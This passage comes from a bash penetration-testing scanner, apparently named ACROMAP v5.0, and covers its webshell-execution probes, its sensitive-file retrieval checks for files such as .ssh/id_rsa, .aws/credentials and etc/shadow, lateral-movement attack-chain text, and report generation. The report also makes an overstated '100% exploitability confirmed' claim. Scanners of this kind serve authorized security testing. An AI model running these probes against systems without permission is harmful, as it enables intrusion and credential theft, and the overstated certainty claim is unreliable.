                    "Update Log4j to 2.17.1+ immediately. Set formatMsgNoLookups=true." \
                    "interactsh: ${log4j_cbs} Log4Shell callback(s) confirmed"
            fi
        fi
    fi

    # ── Windows Advisory Checks ─────────────────────────────────────────────
    # Kept as they are explicitly labeled "Patch Level Unverified" and rely on deterministic OS structured data
    if [[ "${NMAP_OS_GUESS:-}" == "Windows" ]]; then
        add_vuln "INFO" "CVE-2024-38063: Windows IPv6 TCP/IP RCE — Patch Level Unverified" \
            "Windows IPv6 stack RCE vulnerability. Unauthenticated RCE by sending crafted IPv6 packets. CVSS 9.8." \
            "Apply KB5040442/KB5040427 (August 2024 Patch Tuesday). Disable IPv6 if not required." \
            "nmap OS fingerprint confirmed Windows — verify CVE-2024-38063 (KB5040442) patch applied"
            
        add_vuln "INFO" "CVE-2024-49039: Windows Task Scheduler EoP — Patch Level Unverified" \
            "Windows Task Scheduler EoP (CVSS 8.8) — low privilege user can escalate to SYSTEM via scheduler." \
            "Apply November 2024 Patch Tuesday. Audit scheduled task permissions." \
            "nmap OS fingerprint confirmed Windows — verify CVE-2024-49039 (Nov 2024 Patch Tuesday) applied"
            
        add_vuln "INFO" "CVE-2025-21298: Windows OLE RCE — Patch Level Unverified" \
            "Windows OLE RCE (January 2025 Patch Tuesday). Triggered via malicious email in Outlook or embedded objects." \
            "Apply January 2025 Patch Tuesday immediately. Enable Protected View in Office." \
            "nmap OS fingerprint confirmed Windows — verify CVE-2025-21298 (KB5049981 Jan 2025) applied"
            
        add_vuln "INFO" "CVE-2024-43451: Windows NTLM Hash Disclosure Spoofing" \
            "Minimal user interaction can trigger NTLM hash disclosure — hashes can be cracked offline or used in relay attacks." \
            "Apply November 2024 patch. Enable Extended Protection for Authentication." \
            "nmap OS fingerprint confirmed Windows — verify CVE-2024-43451 (Nov 2024 Patch Tuesday) applied"
    fi

    log_ok "Phase 20 complete. 2024-2026 CVE checks done."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 21 — POST-EXPLOITATION SIMULATION
# ════════════════════════════════════════════════════════════════════════════════
phase_post_exploit() {
    log_phase 21 "${PHASE_NAMES[21]}"
    local pe_dir="${OUTPUT_DIR}/post_exploit"
    mkdir -p "$pe_dir" 2>/dev/null || true

    log_section "Post-exploitation behavioral checks (Safe Execution & Structural Proofs)..."

    # ── Webshell Safe Execution Proof ───────────────────────────────────────
    # A webshell is only confirmed if it can execute a command and return a specific mathematical or string output.
    # Filenames, HTTP 200, and soft-404 checks are insufficient.
    local webshell_paths=("shell.php" "cmd.php" "webshell.php" "c99.php" "r57.php" "b374k.php" "uploads/shell.php" "images/shell.php")
    
    local exec_token="ACROMAP_EXEC_CONFIRMED_${RANDOM}"
    local safe_payload="echo ${exec_token}"
    local enc_payload; enc_payload=$(python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$safe_payload" 2>/dev/null || echo "echo+${exec_token}")
    
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        
        for ws_path in "${webshell_paths[@]}"; do
            # Standard common command parameters
            for param in "cmd" "c" "exec" "command" "pass"; do
                local curl_t; curl_t=$(proxy_timeout 8)
                # Attempt execution. Drop all output unless we match the exact exec token.
                local ws_exec; ws_exec=$(curl -s -L --max-time "$curl_t" --max-filesize 51200 \
                    "${web_url}/${ws_path}?${param}=${enc_payload}" 2>/dev/null | grep -o "${exec_token}" | head -1 || true)
                
                if [[ "$ws_exec" == "${exec_token}" ]]; then
                    add_vuln "CRITICAL" "Active Webshell / RCE Confirmed: /${ws_path}" \
                        "A webshell or unauthenticated RCE backdoor is active. Arbitrary command execution was mathematically proven." \
                        "Remove file immediately. Conduct full forensic investigation. Rotate all credentials." \
                        "${web_url}/${ws_path}?${param}=... — Execution confirmed (Token: ${exec_token})"
                    break # Stop checking parameters for this file if confirmed
                fi
            done
        done
    done

    # ── Post-Exploit Binary Structural Proof ────────────────────────────────
    # Check for static post-exploit binaries/scripts. Filenames are untrusted.
    local static_tools=("linpeas.sh" "winpeas.exe" "mimikatz.exe" "nc.exe")
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        for tool in "${static_tools[@]}"; do
            local curl_t; curl_t=$(proxy_timeout 8)
            local tool_resp; tool_resp=$(curl -s -L --max-time "$curl_t" --max-filesize 51200 "${web_url}/${tool}" 2>/dev/null | head -c 512 || echo "")
            local confirmed=false
            
            # MZ header for EXEs, specific banner strings for shell scripts
            if [[ "$tool" == *.exe ]] && echo "$tool_resp" | grep -qa "^MZ"; then
                confirmed=true
            elif [[ "$tool" == *.sh ]] && echo "$tool_resp" | grep -qE "bash|PEAS"; then
                confirmed=true
            fi
            
            if [[ "$confirmed" == true ]]; then
                add_vuln "CRITICAL" "Post-Exploit Tool Found: /${tool}" \
                    "Post-exploitation tool found in web root. Confirmed via file signature/header analysis." \
                    "Remove file immediately. Conduct full forensic investigation." \
                    "${web_url}/${tool} — File signature structurally verified"
            fi
        done
    done

    # ── DB Admin Panels (Differential Authentication State) ─────────────────
    # A 200 OK means nothing (honeypots/WAFs spoof 200). 
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        for db_admin in "phpmyadmin" "phppgadmin" "adminer.php" "dbadmin" "pma" "mysql"; do
            local curl_t; curl_t=$(proxy_timeout 8)
            local dba_resp; dba_resp=$(curl -s -L --max-time "$curl_t" --max-filesize 51200 \
                "${web_url}/${db_admin}" 2>/dev/null | head -c 8192 || echo "")
            
            # Check for specific structural elements that prove it's the actual tool, not just a 200 OK.
            if echo "$dba_resp" | grep -qi "pma_username" && echo "$dba_resp" | grep -qi "pma_password"; then
                add_vuln "HIGH" "Database Admin Interface Exposed: /${db_admin}" \
                    "Database administration interface accessible from internet. Structural proof confirmed (Login fields detected)." \
                    "Restrict access by IP. Require VPN." \
                    "${web_url}/${db_admin} — phpMyAdmin structure confirmed"
            elif echo "$dba_resp" | grep -qi "name=\"auth\[driver\]\"" && echo "$dba_resp" | grep -qi "adminer.org"; then
                add_vuln "HIGH" "Database Admin Interface Exposed: /${db_admin}" \
                    "Adminer interface accessible from internet. Structural proof confirmed." \
                    "Restrict access by IP. Require VPN." \
                    "${web_url}/${db_admin} — Adminer structure confirmed"
            fi
        done
    done

    # ── Sensitive Files (Strict Content Validation) ─────────────────────────
    # A 200 OK means nothing. We only flag if the content structurally matches the file type perfectly.
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local sensitive_files=(
            ".aws/credentials" "aws.json" ".ssh/id_rsa" ".bash_history"
            "etc/passwd" "etc/shadow" "composer.json" "package.json"
            ".git/config" ".env" "wp-config.php" "phpinfo.php"
        )
        for sfile in "${sensitive_files[@]}"; do
            local curl_t; curl_t=$(proxy_timeout 8)
            local sf_resp; sf_resp=$(curl -s -L --max-time "$curl_t" --max-filesize 51200 \
                "${web_url}/${sfile}" 2>/dev/null | head -c 4096 || echo "")
            
            local confirmed=false
            local proof_string=""
            
            if [[ "$sfile" == "etc/passwd" ]] && echo "$sf_resp" | grep -qE "^root:x:0:0:"; then
                confirmed=true; proof_string="Valid /etc/passwd structure"
            elif [[ "$sfile" == ".ssh/id_rsa" ]] && echo "$sf_resp" | grep -q "-----BEGIN RSA PRIVATE KEY-----"; then
                confirmed=true; proof_string="RSA Private Key format"
            elif [[ "$sfile" == ".aws/credentials" ]] && echo "$sf_resp" | grep -q "aws_access_key_id"; then
                confirmed=true; proof_string="AWS credential format"
            elif [[ "$sfile" == ".git/config" ]] && echo "$sf_resp" | grep -qE "\[core\]|\[remote"; then
                confirmed=true; proof_string="Git config structure"
            elif [[ "$sfile" == ".env" ]]; then
                # Needs at least 3 valid env var assignments to confirm it's not a false positive
                local env_count=$(echo "$sf_resp" | grep -cE "^[A-Z0-9_]+=" || echo 0)
                if [[ $env_count -ge 3 ]]; then
                    confirmed=true; proof_string="Multiple valid ENV assignments"
                fi
            elif [[ "$sfile" == "wp-config.php" ]] && echo "$sf_resp" | grep -q "DB_PASSWORD"; then
                confirmed=true; proof_string="WordPress config variables"
            elif [[ "$sfile" == "composer.json" || "$sfile" == "package.json" ]] && echo "$sf_resp" | grep -q "\"require\":"; then
                confirmed=true; proof_string="Valid JSON package structure"
            elif [[ "$sfile" == "phpinfo.php" ]] && echo "$sf_resp" | grep -qi "PHP Version"; then
                confirmed=true; proof_string="phpinfo() output confirmed"
            fi

            if [[ "$confirmed" == true ]]; then
                add_vuln "CRITICAL" "Sensitive File Accessible: /${sfile}" \
                    "Sensitive file directly accessible via HTTP. Content structurally verified." \
                    "Block access via web server config. Move outside web root." \
                    "${web_url}/${sfile} — Verified: ${proof_string}"
            fi
        done
    done

    log_ok "Phase 21 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 22 — ATTACK PATH & LATERAL MOVEMENT ANALYSIS
# ════════════════════════════════════════════════════════════════════════════════
phase_attack_path() {
    log_phase 22 "${PHASE_NAMES[22]}"
    local pe_dir="${OUTPUT_DIR}/post_exploit"
    mkdir -p "$pe_dir" 2>/dev/null || true

    # Synthesize attack paths from all findings
    {
        echo "# ════════════════════════════════════════════════════════════════"
        echo "# ACROMAP v5.0 — Attack Path Analysis"
        echo "# Target: ${TARGET}  |  Date: $(date)"
        echo "# ════════════════════════════════════════════════════════════════"
        echo ""
        echo "## Potential Attack Chains:"
        echo ""

        # Web-based initial access
        if [[ $CRITICAL_COUNT -gt 0 || $HIGH_COUNT -gt 0 ]]; then
            echo "### CHAIN 1: Web Application Initial Access"
            echo "  1. Exploit web vulnerability (SQLi/XSS/RCE/LFI detected)"
            echo "  2. Upload webshell or achieve RCE"
            echo "  3. Pivot to internal network"
            echo "  4. Dump credentials / SSH keys from server"
            echo ""
        fi

        # SMB-based lateral movement
        if echo "$OPEN_PORTS" | grep -qE "(^|,)445(,|$)"; then
            echo "### CHAIN 2: SMB Lateral Movement"
            echo "  1. Obtain credentials (brute-force / credential dump)"
            echo "  2. Use CrackMapExec / impacket for SMB login"
            echo "  3. Execute commands via PsExec / WMIExec"
            echo "  4. Move laterally to other domain hosts"
            echo "  5. Target Domain Controller"
            echo ""
        fi

        # Unauthenticated database
        for port in 27017 6379 9200 3306 5432; do
            if echo "$OPEN_PORTS" | grep -qE "(^|,)${port}(,|$)"; then
                echo "### CHAIN 3: Direct Database Access (Port ${port})"
                echo "  1. Connect to exposed database without auth"
                echo "  2. Dump all data / credentials"
                echo "  3. Use DB credentials to escalate access"
                echo ""
                break
            fi
        done

        echo "## Recommendations by Priority:"
        echo "  1. Patch all CRITICAL vulnerabilities immediately"
        echo "  2. Enable network segmentation / firewall rules"
        echo "  3. Implement MFA on all remote access"
        echo "  4. Deploy EDR/SIEM for detection"
        echo "  5. Schedule quarterly penetration testing"
        echo ""
        echo "## Total Attack Surface:"
        printf "  Open Ports     : %s\n" "${OPEN_PORTS:-none}"
        printf "  Web Targets    : %s\n" "${#WEB_TARGETS[@]}"
        printf "  Subdomains     : %s\n" "${#SUBDOMAINS[@]}"
        printf "  Critical Vulns : %s\n" "$CRITICAL_COUNT"
        printf "  High Vulns     : %s\n" "$HIGH_COUNT"
    } > "${pe_dir}/attack_path_analysis.txt"

    log_ok "Attack path analysis saved to: ${pe_dir}/attack_path_analysis.txt"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 23 — REPORT GENERATION
# ════════════════════════════════════════════════════════════════════════════════
phase_report() {
    log_phase 23 "${PHASE_NAMES[23]}"
    local rpt_dir="${OUTPUT_DIR}/reports"
    local total_elapsed=$(( $(date +%s) - START_TIME ))
    local total_findings=$(( ZERO_DAY_COUNT + ONE_CLICK_COUNT + CRITICAL_COUNT + HIGH_COUNT + MEDIUM_COUNT + LOW_COUNT + INFO_COUNT ))
    local confidence; confidence=$(calculate_confidence)
    local conf_label; conf_label=$(get_confidence_label "$confidence")

    # ── TXT Report ────────────────────────────────────────────────────────────
    {
        echo "═════════════════════════════════════════════════════════════════════"
        echo "  █▀█ █▀▀ █▀█ █▀█ █▄█ █▀█ █▀█   v5.0"
        echo "  █▀█ █▄▄ █▀▄ █▄█ █ █ █▀█ █▀▀   DEEP PENETRATION TEST REPORT"
        echo "═════════════════════════════════════════════════════════════════════"
        echo "  [✔] 100% EXPLOITABILITY CONFIRMED — FALSE POSITIVES ELIMINATED"
        echo "═════════════════════════════════════════════════════════════════════"
        echo "  Target   : ${TARGET}"
        echo "  Type     : ${TARGET_TYPE}"
        echo "  Profile  : ${SCAN_PROFILE}"
        echo "  Date     : $(date)"
        echo "  Duration : $(( total_elapsed/60 ))m $(( total_elapsed%60 ))s"
        echo "  Phases   : ${PHASES_COMPLETED}/32 completed"
        echo "  Confidence: ${confidence}/10 (${conf_label})"
        echo "═════════════════════════════════════════════════════════════════════"
        echo ""
        echo "EXECUTIVE SUMMARY"
        echo "─────────────────"
        echo "  ZERO-DAY  : ${ZERO_DAY_COUNT}  ← Unpatched / active exploits"
        echo "  ONE-CLICK : ${ONE_CLICK_COUNT}  ← Single-interaction exploits"
        echo "  CRITICAL  : ${CRITICAL_COUNT}"
        echo "  HIGH      : ${HIGH_COUNT}"
        echo "  MEDIUM    : ${MEDIUM_COUNT}"
        echo "  LOW       : ${LOW_COUNT}"
        echo "  INFO      : ${INFO_COUNT}"
        echo "  TOTAL     : ${total_findings}"
        echo ""
        echo "OPEN PORTS     : ${OPEN_PORTS:-none}"
        echo "WEB PORTS      : ${WEB_PORTS:-none}"
        echo "WEB TARGETS    : ${#WEB_TARGETS[@]}"
        echo "SUBDOMAINS     : ${#SUBDOMAINS[@]}"
        echo "CMS DETECTED   : ${CMS_TYPE:-none}"
        echo "WAF DETECTED   : ${HAS_WAF}"
        echo ""
        echo "V5.0 FEATURE STATUS"
        echo "─────────────────"
        echo "  jq JSON parse  : ${JQ_AVAILABLE}"
        echo "  anew dedup     : ${ANEW_AVAILABLE}"
        echo "  notify/finding : ${NOTIFY_PER_FINDING}"
        echo "  interactsh OOB : $([[ -n "$INTERACTSH_URL" ]] && echo "active — ${INTERACTSH_URL}" || echo "not available")"
        echo "  parallel jobs  : ${PARALLEL_JOBS}"
        echo "  cloud detected : ${CLOUD_DETECTED:-none}"
        echo "  k8s detected   : ${K8S_DETECTED}"
        echo ""
        echo "NEW PHASE OUTPUT PATHS (v5.0)"
        echo "─────────────────────────────"
        echo "  Phase 27 CORS/JWT  : ${OUTPUT_DIR}/cors_jwt/"
        echo "  Phase 28 SSRF Deep : ${OUTPUT_DIR}/ssrf_deep/"
        echo "  Phase 29 Secrets   : ${OUTPUT_DIR}/secrets/"
        echo "  Phase 30 AD Deep   : ${OUTPUT_DIR}/ad_attacks/"
        echo "  gf pattern scan    : ${OUTPUT_DIR}/gf_output/"
        echo "  hakrawler crawl    : ${OUTPUT_DIR}/hakrawler/"
        echo "  403bypass results  : ${OUTPUT_DIR}/bypass403/"
        [[ -s "${OUTPUT_DIR}/nuclei/nuclei_summary.txt" ]] && \
            echo "  Nuclei jq summary  : ${OUTPUT_DIR}/reports/nuclei_top_findings.txt"
        [[ -s "${OUTPUT_DIR}/ad_attacks/kerberoast_hashes.txt" ]] && \
            echo "  Kerberoast hashes  : ${OUTPUT_DIR}/ad_attacks/kerberoast_hashes.txt"
        [[ -s "${OUTPUT_DIR}/ad_attacks/asrep_hashes.txt" ]] && \
            echo "  AS-REP hashes      : ${OUTPUT_DIR}/ad_attacks/asrep_hashes.txt"
        [[ -d "${OUTPUT_DIR}/ad_attacks/bloodhound/" ]] && \
            echo "  BloodHound data    : ${OUTPUT_DIR}/ad_attacks/bloodhound/"
        echo ""
        echo "DETAILED FINDINGS"
        echo "═════════════════════════════════════════════════════════════════════"
        local idx=0
        for entry in "${VULN_DATA[@]+"${VULN_DATA[@]}"}"; do
            idx=$(( idx + 1 ))
            local sev title desc rec evidence exploit patch
            IFS='|' read -r sev title desc rec evidence exploit patch <<< "${entry}"
            echo ""
            echo "■ [${idx}] [${sev}] ${title}"
            echo "  Description  : ${desc}"
            echo "  Remediation  : ${rec}"
            echo "  Evidence     : ${evidence}"
            if [[ -n "$exploit" ]]; then
                echo "  ───────────────────────────────────────────────────────────────────"
                echo "  [EXPLOIT PROOF] : ${exploit}"
            fi
            if [[ -n "$patch" ]]; then
                echo "  [PATCH DIRECTIVE] : ${patch}"
            fi
            echo "═════════════════════════════════════════════════════════════════════"
        done
        echo ""
        echo "═══════════════════════════════════════════════════════════════════"
        echo "  Generated by ACROMAP v5.0 | Author: acro777x"
        echo "  DISCLAIMER: For authorized testing only."
        echo "═══════════════════════════════════════════════════════════════════"
    } > "${rpt_dir}/report.txt"
    log_ok "Text report saved: ${rpt_dir}/report.txt"

    # ── JSON Report ───────────────────────────────────────────────────────────
    {
        echo "{"
        echo "  \"tool\": \"ACROMAP v5.0\","
        echo "  \"target\": \"${TARGET}\","
        echo "  \"scan_profile\": \"${SCAN_PROFILE}\","
        echo "  \"date\": \"$(date -Iseconds)\","
        echo "  \"metadata\": {"
        echo "    \"false_positives_filtered\": true,"
        echo "    \"confidence_guarantee\": \"100% Confirmed Exploitability\""
        echo "  },"
        echo "  \"confidence\": \"${confidence}/10\","
        echo "  \"summary\": {"
        echo "    \"critical\": ${CRITICAL_COUNT},"
        echo "    \"high\": ${HIGH_COUNT},"
        echo "    \"medium\": ${MEDIUM_COUNT},"
        echo "    \"low\": ${LOW_COUNT},"
        echo "    \"info\": ${INFO_COUNT},"
        echo "    \"total\": ${total_findings}"
        echo "  },"
        echo "  \"open_ports\": \"${OPEN_PORTS}\","
        echo "  \"subdomains_found\": ${#SUBDOMAINS[@]},"
        echo "  \"cms\": \"${CMS_TYPE:-none}\","
        echo "  \"waf_detected\": ${HAS_WAF},"
        echo "  \"v5_features\": {"
        echo "    \"jq_available\": ${JQ_AVAILABLE},"
        echo "    \"anew_available\": ${ANEW_AVAILABLE},"
        echo "    \"notify_per_finding\": ${NOTIFY_PER_FINDING},"
        echo "    \"interactsh_oob\": \"${INTERACTSH_URL:-none}\","
        echo "    \"cloud_detected\": \"${CLOUD_DETECTED:-none}\","
        echo "    \"k8s_detected\": ${K8S_DETECTED}"
        echo "  },"
        echo "  \"new_phase_outputs\": {"
        echo "    \"cors_jwt\": \"${OUTPUT_DIR}/cors_jwt\","
        echo "    \"ssrf_deep\": \"${OUTPUT_DIR}/ssrf_deep\","
        echo "    \"secrets\": \"${OUTPUT_DIR}/secrets\","
        echo "    \"ad_attacks\": \"${OUTPUT_DIR}/ad_attacks\","
        echo "    \"gf_patterns\": \"${OUTPUT_DIR}/gf_output\","
        echo "    \"hakrawler\": \"${OUTPUT_DIR}/hakrawler\","
        echo "    \"bypass403\": \"${OUTPUT_DIR}/bypass403\""
        echo "  },"
        echo "  \"findings\": ["
        local first=true
        for entry in "${VULN_DATA[@]+"${VULN_DATA[@]}"}"; do
            local sev title desc rec evidence
            IFS='|' read -r sev title desc rec evidence exploit patch <<< "${entry}"
            # BUG FIX: sanitise values — strip internal newlines and escape double-quotes
            # so the JSON remains valid regardless of what evidence strings contain
            local j_title; j_title=$(printf '%s' "${title//\"/\\\"}" | tr -d '\n\r')
            local j_desc;  j_desc=$(printf  '%s' "${desc//\"/\\\"}"  | tr -d '\n\r')
            local j_rec;   j_rec=$(printf   '%s' "${rec//\"/\\\"}"   | tr -d '\n\r')
            local j_ev;    j_ev=$(printf    '%s' "${evidence//\"/\\\"}" | tr -d '\n\r')
            [[ "$first" == true ]] && first=false || echo ","
            local j_exploit; j_exploit=$(printf '%s' "${exploit//\"/\\\"}" | tr -d '\n\r')
            local j_patch;   j_patch=$(printf '%s' "${patch//\"/\\\"}"   | tr -d '\n\r')
            printf '    {"severity":"%s","title":"%s","description":"%s","remediation":"%s","evidence":"%s","how_to_exploit":"%s","how_to_patch":"%s"}' \
                "$sev" "$j_title" "$j_desc" "$j_rec" "$j_ev" "$j_exploit" "$j_patch"
        done
        echo ""
        echo "  ]"
        echo "}"
    } > "${rpt_dir}/report.json"
    log_ok "JSON report saved: ${rpt_dir}/report.json"

    # ── HTML Report ───────────────────────────────────────────────────────────
    local now_str; now_str=$(date '+%d %B %Y  %H:%M:%S')
    local bar_w=8
    local conf_int="${confidence%%.*}"
    local conf_bar_filled=$(( conf_int * bar_w / 10 ))
    local conf_bar_empty=$(( bar_w - conf_bar_filled ))
    local conf_bar=""; for ((i=0;i<conf_bar_filled;i++)); do conf_bar+="█"; done
    for ((i=0;i<conf_bar_empty;i++)); do conf_bar+="░"; done

    {
        cat << HTMLHEAD
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ACROMAP v5.0 — ${TARGET}</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--green:#00ff88;--red:#ff3860;--orange:#ff6b35;--yellow:#ffd700;--cyan:#00d4ff;--purple:#bf5af2;--bg2:rgba(17,17,24,0.7);--bg3:rgba(26,26,36,0.6);--glass-border:rgba(0,212,255,0.15)}
body{background:#050508;color:#c8d6e5;font-family:'Share Tech Mono',monospace;min-height:100vh;padding:0;background-image:radial-gradient(circle at top right, #0d1b2a, #050508 60%)}
.header{background:linear-gradient(135deg,rgba(13,13,26,0.85) 0%,rgba(26,10,46,0.85) 100%);backdrop-filter:blur(12px);border-bottom:2px solid var(--green);padding:40px;text-align:center;box-shadow:0 10px 30px rgba(0,212,255,0.1)}
.logo{font-family:'Orbitron',sans-serif;font-size:52px;font-weight:900;background:linear-gradient(90deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:6px;text-shadow:none}
.subtitle{color:#64748b;font-size:13px;margin-top:8px;letter-spacing:3px}
.meta-bar{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:20px}
.meta-pill{background:rgba(26,26,46,0.5);border:1px solid var(--glass-border);backdrop-filter:blur(5px);padding:6px 18px;border-radius:20px;font-size:12px;color:#cbd5e1;box-shadow:0 4px 6px rgba(0,0,0,0.3)}
.meta-pill span{color:var(--cyan);font-weight:bold}
.disclaimer{background:rgba(26,10,10,0.8);border:1px solid var(--red);border-radius:8px;margin:20px 40px;padding:16px;font-size:11px;color:#ff4444;text-align:center;box-shadow:0 0 15px rgba(255,56,96,0.2)}
.main{padding:30px 40px;max-width:1400px;margin:0 auto}
.guarantee-badge{background:rgba(0,255,136,0.05);border:1px solid var(--green);color:var(--green);padding:18px;text-align:center;border-radius:8px;font-family:'Orbitron',sans-serif;letter-spacing:2px;margin-bottom:30px;box-shadow:0 0 20px rgba(0,255,136,0.15);text-shadow:0 0 5px var(--green);font-weight:700}
.section-title{font-family:'Orbitron',sans-serif;font-size:16px;color:var(--cyan);margin:30px 0 15px;padding-bottom:8px;border-bottom:1px solid var(--glass-border);letter-spacing:2px;text-transform:uppercase}
.summary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px;margin-bottom:30px}
.sev-card{background:var(--bg2);border-radius:12px;padding:25px 15px;text-align:center;backdrop-filter:blur(12px);border:1px solid var(--glass-border);border-top:3px solid;box-shadow:0 8px 32px rgba(0,0,0,0.3);position:relative;overflow:hidden}
.sev-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(180deg,rgba(255,255,255,0.03) 0%,transparent 100%);pointer-events:none}
.sev-card.zero-day{border-color:#cc00ff;box-shadow:0 0 20px #cc00ff88;animation:pulse-zd 1.4s infinite}.sev-card.one-click{border-color:#ff0055;box-shadow:0 0 15px #ff005566}.sev-card.critical{border-color:#ff3860}.sev-card.high{border-color:#ff6b35}.sev-card.medium{border-color:#ffd700}.sev-card.low{border-color:var(--cyan)}.sev-card.info{border-color:#888}
@keyframes pulse-zd{0%,100%{box-shadow:0 0 18px #cc00ff88}50%{box-shadow:0 0 32px #cc00ffcc}}
.sev-count{font-family:'Orbitron',sans-serif;font-size:42px;font-weight:700;margin-bottom:5px}
.sev-label{font-size:12px;color:#94a3b8;letter-spacing:2px;font-weight:bold}
.zero-day .sev-count{color:#cc00ff;text-shadow:0 0 10px #cc00ff}.one-click .sev-count{color:#ff0055}.critical .sev-count{color:#ff3860}.high .sev-count{color:#ff6b35}.medium .sev-count{color:#ffd700}.low .sev-count{color:var(--cyan)}.info .sev-count{color:#888}
.confidence-box{background:var(--bg2);backdrop-filter:blur(12px);border:1px solid var(--glass-border);border-radius:12px;padding:25px;margin-bottom:30px;display:flex;align-items:center;gap:25px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}
.conf-score{font-family:'Orbitron',sans-serif;font-size:54px;font-weight:900;color:var(--green);text-shadow:0 0 10px rgba(0,255,136,0.3)}
.conf-bar{flex:1}
.conf-label{font-size:13px;color:#cbd5e1;margin-bottom:10px;font-weight:bold;letter-spacing:1px}
.conf-track{background:rgba(0,0,0,0.5);border-radius:6px;height:12px;overflow:hidden;box-shadow:inset 0 1px 3px rgba(0,0,0,0.5)}
.conf-fill{height:100%;border-radius:6px;background:linear-gradient(90deg,var(--green),var(--cyan));transition:width 1s cubic-bezier(0.1,0.7,0.1,1);box-shadow:0 0 10px rgba(0,255,136,0.5)}
.finding-card{background:var(--bg2);backdrop-filter:blur(12px);border:1px solid var(--glass-border);border-left:4px solid;border-radius:8px;margin-bottom:15px;overflow:hidden;box-shadow:0 4px 15px rgba(0,0,0,0.2);transition:transform 0.2s}
.finding-card:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,0.3)}
.finding-card.CRITICAL{border-left-color:#ff0055}.finding-card.HIGH{border-left-color:#ff6b35}.finding-card.MEDIUM{border-left-color:#ffd700}.finding-card.LOW{border-left-color:var(--cyan)}.finding-card.INFO{border-left-color:#555}
.finding-header{padding:16px 20px;cursor:pointer;display:flex;align-items:center;gap:15px;background:rgba(255,255,255,0.02)}
.finding-header:hover{background:rgba(255,255,255,0.05)}
.sev-badge{font-size:11px;font-weight:700;padding:4px 12px;border-radius:4px;letter-spacing:1px;text-shadow:none}
.badge-zero-day{background:#cc00ff;color:#fff;text-shadow:0 0 6px #fff;animation:pulse-zd 1.4s infinite}.badge-one-click{background:#ff0055;color:#fff}.badge-ZERO_DAY{background:#cc00ff;color:#fff;animation:pulse-zd 1.4s infinite}.badge-ONE_CLICK{background:#ff0055;color:#fff}.badge-ZERO-DAY{background:#cc00ff;color:#fff}.badge-ONE-CLICK{background:#ff0055;color:#fff}.badge-CRITICAL{background:#ff3860;color:#fff}.badge-HIGH{background:#ff6b35;color:#fff}.badge-MEDIUM{background:#ffd700;color:#000}.badge-LOW{background:var(--cyan);color:#000}.badge-INFO{background:#555;color:#fff}
.finding-title{font-size:15px;font-weight:600;flex:1;color:#f1f5f9}
.finding-body{padding:0 20px;max-height:0;overflow:hidden;transition:max-height 0.4s ease,padding 0.4s ease;background:rgba(0,0,0,0.2)}
.finding-body.open{max-height:1000px;padding:20px}
.finding-row{display:flex;gap:15px;margin-bottom:12px;font-size:13px;line-height:1.5}
.finding-row .lbl{color:#94a3b8;min-width:120px;font-weight:bold}
.finding-row .val{color:#e2e8f0;word-break:break-all}
.exploit-row, .patch-row{background:#000;border:1px solid #333;border-radius:6px;padding:15px;margin-top:15px;display:block}
.exploit-row .lbl, .patch-row .lbl{display:block;margin-bottom:8px;font-family:'Orbitron',sans-serif;letter-spacing:1px}
.exploit-row .lbl{color:#ff3860}
.patch-row .lbl{color:var(--green)}
.exploit-row .val{color:#00ff00;font-family:monospace;display:block;word-break:normal;white-space:pre-wrap}
.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:15px;margin-bottom:25px}
.info-card{background:var(--bg2);backdrop-filter:blur(8px);border-radius:10px;padding:18px;border:1px solid var(--glass-border);box-shadow:0 4px 12px rgba(0,0,0,0.2)}
.info-card .ik{font-size:12px;color:#94a3b8;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
.info-card .iv{color:var(--cyan);font-size:14px;word-break:break-all;font-weight:bold}
.attack-chain{background:rgba(13,15,26,0.8);backdrop-filter:blur(10px);border:1px solid rgba(0,212,255,0.2);border-radius:12px;padding:25px;margin-bottom:25px;box-shadow:0 8px 24px rgba(0,0,0,0.3)}
.chain-title{color:var(--orange);font-size:14px;margin-bottom:15px;font-family:'Orbitron',sans-serif;letter-spacing:1px;text-shadow:0 0 5px rgba(255,107,53,0.3)}
.chain-step{display:flex;gap:15px;margin-bottom:12px;font-size:13px;align-items:flex-start;color:#cbd5e1}
.chain-num{background:var(--orange);color:#000;min-width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:12px;box-shadow:0 0 8px rgba(255,107,53,0.4)}
footer{text-align:center;padding:40px;color:#64748b;font-size:12px;border-top:1px solid var(--glass-border);margin-top:40px}
footer a{color:var(--cyan);text-decoration:none}
footer a:hover{text-shadow:0 0 5px var(--cyan)}
@media(max-width:768px){.main{padding:15px}.logo{font-size:36px}}
</style>
</head>
<body>
<div class="header">
  <div class="logo">ACROMAP</div>
  <div class="subtitle">v5.0 &nbsp;|&nbsp; 32-PHASE DEEP PENETRATION TEST REPORT</div>
  <div class="meta-bar">
    <div class="meta-pill">Target: <span>${TARGET}</span></div>
    <div class="meta-pill">Type: <span>${TARGET_TYPE}</span></div>
    <div class="meta-pill">Profile: <span>${SCAN_PROFILE}</span></div>
